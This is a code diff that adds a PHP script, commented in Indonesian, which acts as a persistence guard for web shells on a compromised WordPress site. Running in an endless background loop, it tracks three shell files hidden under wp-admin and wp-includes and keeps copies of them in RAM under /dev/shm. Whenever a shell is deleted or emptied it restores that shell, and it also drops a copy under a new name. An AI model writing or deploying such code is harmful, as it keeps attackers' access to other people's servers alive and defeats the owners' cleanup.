@@ -1,0 +1,54 @@
+<?php
+ignore_user_abort(true);
+set_time_limit(0);
+
+$dir = dirname(__FILE__);
+// Daftar file asli (target)
+$shells = [
+    '/home/ansa3461/public_html/anshara.id/wp-admin/user/cache.php',
+    '/home/ansa3461/public_html/anshara.id/wp-admin/includes/index.php',
+    '/home/ansa3461/public_html/anshara.id/wp-includes/assets/script-packages.php',
+];
+
+// Nama baru jika ingin diganti saat restore (opsional)
+$newName = "/home/ansa3461/public_html/anshara.id/wp-blog-activate.php"; 
+
+while (true) {
+    foreach ($shells as $shell) {
+        $target = $shell;
+        $backup = '/dev/shm/shmdata/' . md5($shell) . '.bak';
+
+        if (!is_dir('/dev/shm/shmdata')) {
+            @mkdir('/dev/shm/shmdata', 0777, true);
+        }
+
+        // 1. CEK: Jika file ada tapi 0kb, atau file tidak ada sama sekali
+        if ((file_exists($target) && filesize($target) == 0) || !file_exists($target)) {
+            
+            // Hapus file 0kb-nya dulu kalau ada
+            if (file_exists($target)) {
+                @unlink($target);
+            }
+
+            // 2. RESTORE: Ambil dari backup di RAM (/dev/shm/)
+            if (file_exists($backup)) {
+                // Opsi A: Balikin ke nama asli
+                @copy($backup, $target);
+                @chmod($target, 0755);
+
+                // Opsi B: Ganti nama (Copy ke lokasi baru juga)
+                @copy($backup, $newName);
+                @chmod($newName, 0755);
+            }
+        } 
+        
+        // 3. UPDATE BACKUP: Jika file asli sehat (bukan 0kb), update cadangan di RAM
+        else {
+            if (!file_exists($backup) || md5_file($target) !== md5_file($backup)) {
+                @file_put_contents($backup, file_get_contents($target));
+                @chmod($backup, 0444);
+            }
+        }
+    }
+    sleep(10); // Jeda 10 detik biar CPU gak panas
+}
